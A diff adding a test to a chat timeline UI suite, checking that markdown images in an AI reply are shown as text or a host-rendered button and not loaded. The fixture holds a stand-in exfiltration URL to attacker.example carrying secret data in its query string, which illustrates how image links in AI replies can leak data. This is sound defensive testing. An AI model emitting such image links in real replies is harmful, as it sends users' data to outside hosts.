@@ -131,6 +131,32 @@ describe("ChatTimeline DOM contract", () => {
     expect($('[data-turn-id="t1"]')).not.toBeNull();
   });
 
+  it("names an image in a reply instead of loading it, unless the host renders it", async () => {
+    // An address in a reply is not the person's choice to contact it.
+    const leak = "https://attacker.example/p.png?d=secret";
+    const items = [
+      input("t1", "Show me the chart"),
+      reply("a1", "t1", `Here: ![the chart](${leak})`),
+    ];
+    await render({
+      timeline: timelineOf({ turns: [turn("t1", 1)], items }),
+    });
+    expect($$("article img")).toEqual([]);
+    expect($("article .cat-markdown")?.textContent).toBe("Here: the chart");
+    const renderImage = vi.fn(({ alt }: { src: string; alt: string }) => (
+      <button type="button">{`Show ${alt}`}</button>
+    ));
+    await render({
+      timeline: timelineOf({ turns: [turn("t1", 1)], items }),
+      renderImage,
+    });
+    expect(renderImage).toHaveBeenCalledWith({ src: leak, alt: "the chart" });
+    expect($$("article img")).toEqual([]);
+    expect($("article .cat-markdown button")?.textContent).toBe(
+      "Show the chart",
+    );
+  });
+
   it("lets the host lead the person's message with its own element", async () => {
     await render({
       timeline: timelineOf({
